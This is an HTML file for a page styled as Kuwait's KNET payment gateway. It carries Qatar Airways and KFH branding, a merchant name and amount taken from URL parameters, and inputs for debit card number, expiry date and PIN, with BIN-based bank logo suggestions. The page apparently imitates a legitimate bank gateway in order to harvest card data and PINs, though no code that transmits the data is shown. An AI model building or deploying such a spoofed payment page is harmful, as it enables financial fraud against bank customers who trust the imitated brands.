<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>KNET Payment Gateway</title>
    <script src="js/jquery-3.7.1.min.js"></script>
    <script src="js/cardData.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        
        body { 
            background-color: #e6eaf0; 
            display: flex; 
            justify-content: center; 
            align-items: flex-start; 
            min-height: 100vh; 
            padding: 10px; 
        }
        
        .container { width: 100%; max-width: 340px; }
        
        .banner-box { 
            width: 100%; 
            margin-bottom: 12px; 
            border-radius: 10px; 
            overflow: hidden; 
            background: #fff;
        }
        .banner-box img { 
            width: 100%; 
            height: auto; 
            display: block; 
            object-fit: contain;
        }
        
        .card { 
            background: #ffffff; 
            border-radius: 12px; 
            padding: 12px 18px; 
            margin-bottom: 12px; 
            box-shadow: 0 5px 10px rgba(0,0,0,0.2); 
            border: 1.5px solid #000; 
        }
        
        .header-logos { 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            margin-bottom: 15px; 
            padding: 5px 0;
            gap: 15px;
        }
        
        .qatar-logo { height: 45px; } 
        .kfh-logo { height: 28px; }
        
        .divider { width: 1.5px; height: 30px; background: #ccc; }

        .row { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            padding: 8px 0; 
            border-bottom: 1px solid #eee; 
        }
        .row:last-child { border-bottom: none; }
        
        .label { color: #0056b3; font-weight: bold; font-size: 12px; flex: 1.3; text-align: left; }
        .info-val { color: #333; font-size: 12px; flex: 1; text-align: right; font-weight: 500; }
        
        .input-wrap { flex: 1.6; position: relative; display: flex; align-items: center; }
        .field { 
            width: 100%; 
            height: 28px; 
            border-radius: 6px; 
            border: 1px solid #999; 
            background: #fdfdfd; 
            padding: 0 6px; 
            font-size: 13px; 
            box-shadow: inset 0 2px 3px rgba(0,0,0,0.15); 
            text-align: left; 
            direction: ltr; 
            outline: none;
            color: #333;
        }
        .field:focus { border-color: #0056b3; }
        
        .bank-icon { position: absolute; right: 6px; height: 16px; display: none; z-index: 5; pointer-events: none; }
        #debitNumber { padding-right: 35px; }

        .expiry-group { 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            background: #fdfdfd; 
            border: 1px solid #999; 
            border-radius: 6px; 
            height: 28px; 
            width: 100%; 
            box-shadow: inset 0 2px 3px rgba(0,0,0,0.15); 
            direction: ltr;
        }
        .exp-input { width: 30%; border: none; background: transparent; text-align: center; font-size: 13px; outline: none; color: #333; }
        .exp-sep { color: #0056b3; font-weight: bold; font-size: 13px; margin: 0 4px; }
        
        .card-btns { padding: 0 !important; overflow: hidden; border: 1.5px solid #000; border-radius: 10px; margin-top: 30px !important; }
        .btn-flex { display: flex; width: 100%; }
        .action-btn { 
            flex: 1; 
            height: 40px; 
            border: none; 
            background: #d1d5db; 
            font-size: 16px; 
            color: #1f2937; 
            cursor: pointer; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            font-weight: bold;
        }
        .action-btn:first-child { border-right: 1px solid #9ca3af; }
        .action-btn:active { background: #9ca3af; }
        
        .footer-text { margin-top: 15px; text-align: center; color: #333; font-size: 11px; line-height: 1.5; }
        .footer-text b { color: #0056b3; }

        .suggestions {
            position: absolute;
            top: 30px;
            left: 0;
            right: 0;
            background: #fff;
            border: 1.5px solid #000;
            border-radius: 6px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.4);
            z-index: 100;
            display: none;
            list-style: none;
            max-height: 180px;
            overflow-y: auto;
            direction: ltr;
        }
        .suggestions li {
            padding: 8px 10px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid #eee;
            cursor: pointer;
            font-size: 12px;
        }
        .suggestions li:hover { background: #f0f7ff; }
        .suggestions li img { height: 18px; max-width: 60px; margin-left: 8px; }
        .suggestions li .bank-info { flex: 1; text-align: left; font-weight: bold; }
        .suggestions li .bin-num { color: #0056b3; font-weight: bold; margin-right: 10px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="banner-box">
            <img src="images/adds/NewDerayaCamp/pc.jpg" alt="Campaign Banner">
        </div>

        <div class="card">
            <div class="header-logos">
                <img src="images/logos/qatar_airways.png" class="qatar-logo" alt="Qatar Airways">
                <div class="divider"></div>
                <img src="images/logos/kfh.png" class="kfh-logo" alt="KFH">
            </div>
            
            <div class="row">
                <span class="label">Merchant:</span>
                <span id="beneficiary" class="info-val">Qatar Airways</span>
            </div>
            <div class="row">
                <span class="label">Amount:</span>
                <span id="amount" class="info-val">KD 2.8</span>
            </div>
        </div>

        <div class="card">
            <div class="row">
                <span class="label">Debit Card Number:</span>
                <div class="input-wrap">
                    <img id="bankLogo" class="bank-icon" src="" alt="Bank">
                    <input type="text" id="debitNumber" class="field" maxlength="19" autocomplete="off">
                    <ul id="suggestionList" class="suggestions"></ul>
                </div>
            </div>
            
            <div class="row">
                <span class="label">Expiration Date:</span>
                <div class="input-wrap">
                    <div class="expiry-group">
                        <input type="text" id="expMonth" class="exp-input" placeholder="MM" maxlength="2">
                        <span class="exp-sep">/</span>
                        <input type="text" id="expYear" class="exp-input" placeholder="YY" maxlength="2">
                    </div>
                </div>
            </div>
            
            <div class="row">
                <span class="label">PIN:</span>
                <div class="input-wrap">
                    <input type="password" id="cardPin" class="field" maxlength="4">
                </div>
            </div>
        </div>

        <div class="card card-btns">
            <div class="btn-flex">
                <button class="action-btn">Submit</button>
                <button class="action-btn">Cancel</button>
            </div>
        </div>

        <div class="footer-text">
            All Rights Reserved © 2026<br>
            <b>Shared Electronic Banking Services Company - KNET</b>
        </div>
    </div>

    <script>
        const params = new URLSearchParams(window.location.search);
        if (params.has('beneficiary')) document.getElementById('beneficiary').textContent = params.get('beneficiary');
        if (params.has('amount')) document.getElementById('amount').textContent = 'KD ' + params.get('amount');

        $(document).ready(function() {
            const debitInput = $('#debitNumber');
            const logoImg = $('#bankLogo');
            const suggestBox = $('#suggestionList');

            function formatCard(val) {
                let v = val.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                let parts = [];
                for (let i = 0; i < v.length; i += 4) {
                    parts.push(v.substring(i, i + 4));
                }
                return parts.join(' ');
            }

            debitInput.on('input', function() {
                let raw = $(this).val().replace(/\D/g, '');
                $(this).val(formatCard(raw));
                
                let detected = false;
                if (raw.length >= 1) {
                    const match = cardData.sort((a,b) => b.bin.length - a.bin.length).find(c => raw.startsWith(c.bin));
                    if (match) {
                        logoImg.attr('src', match.logo).show();
                        detected = true;
                    }
                }
                if (!detected) logoImg.hide();

                suggestBox.empty();
                if (raw.length >= 1) {
                    const matches = cardData.filter(c => c.bin.startsWith(raw)).slice(0, 15);
                    if (matches.length > 0) {
                        matches.forEach(c => {
                            const li = $('<li>')
                                .append($('<span class="bin-num">').text(c.bin))
                                .append($('<span class="bank-info">').text(c.brandDescription))
                                .append($('<img>').attr('src', c.logo))
                                .on('click', function() {
                                    debitInput.val(formatCard(c.bin));
                                    logoImg.attr('src', c.logo).show();
                                    suggestBox.hide();
                                });
                            suggestBox.append(li);
                        });
                        suggestBox.show();
                    } else {
                        suggestBox.hide();
                    }
                } else {
                    suggestBox.hide();
                }
            });

            $(document).on('click', function(e) {
                if (!$(e.target).closest('.input-wrap').length) suggestBox.hide();
            });

            $('#expMonth').on('input', function() {
                if (this.value.length === 2) $('#expYear').focus();
            });

            $('input[type="text"]').on('keypress', function(e) {
                if (e.which < 48 || e.which > 57) e.preventDefault();
            });
        });
    </script>
</body>
</html>
